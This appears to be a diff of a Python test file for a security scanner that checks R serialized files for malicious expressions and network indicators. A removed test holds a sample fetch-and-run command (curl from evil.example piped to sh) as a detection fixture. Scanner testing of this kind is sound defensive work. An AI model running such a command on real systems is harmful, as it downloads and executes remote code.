@@ -523,36 +523,7 @@ def test_scan_detects_malicious_expression_and_bypass_noise(tmp_path: Path) -> N
     assert payload_checks[0].status == CheckStatus.FAILED
     assert payload_checks[0].severity == IssueSeverity.CRITICAL
 
-    assert _single_check_status(result, "Embedded Network Indicator Detection") == CheckStatus.FAILED
-
     assert _single_check_status(result, "Credential-like String Detection") == CheckStatus.FAILED
-
-
-def test_scan_redacts_embedded_network_indicator_urls(tmp_path: Path) -> None:
-    path = tmp_path / "malicious.rds"
-    _write_raw_r_serialized(
-        path,
-        "\n".join(
-            [
-                "expression",
-                (
-                    "base::system('curl "
-                    "https://user:pass@evil.example/payload.sh?token=SECRET_TOKEN#SECRET_FRAGMENT | sh')"
-                ),
-            ]
-        ),
-    )
-
-    result = RSerializedScanner().scan(str(path))
-
-    network_checks = _check_by_name(result, "Embedded Network Indicator Detection")
-    assert len(network_checks) == 1
-    details = network_checks[0].details
-    assert details["urls"] == ["https://evil.example/payload.sh"]
-    assert "user" not in str(details)
-    assert "pass" not in str(details)
-    assert "SECRET_TOKEN" not in str(details)
-    assert "SECRET_FRAGMENT" not in str(details)
 
 
 def test_scan_redacts_executable_payload_samples(tmp_path: Path) -> None:
@@ -1666,3 +1637,13 @@ def _assert_r_credential_control(path: Path, text: str) -> None:
     result = RSerializedScanner().scan(str(path))
 
     assert _single_check_status(result, "Credential-like String Detection") == CheckStatus.PASSED
+
+
+def test_r_serialized_passive_network_strings_are_clean(tmp_path: Path) -> None:
+    path = tmp_path / "references.rds"
+    _write_raw_r_serialized(path, "Documentation: https://bit.ly/callback\nResolver: 8.8.8.8\n")
+
+    result = RSerializedScanner().scan(str(path))
+
+    assert result.success
+    assert not result.issues
